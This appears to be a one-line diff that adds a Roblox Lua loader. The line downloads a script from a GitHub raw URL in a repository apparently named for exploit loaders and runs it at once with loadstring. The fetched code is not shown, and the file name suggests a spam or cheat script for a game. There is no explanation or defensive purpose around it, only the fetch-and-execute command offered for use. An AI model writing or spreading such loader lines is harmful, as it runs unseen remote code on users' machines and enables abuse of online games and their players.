@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShinobiComply/loaders/main/loaders/huss-valley-spam6-yf3t95pugo8fer.lua"))()
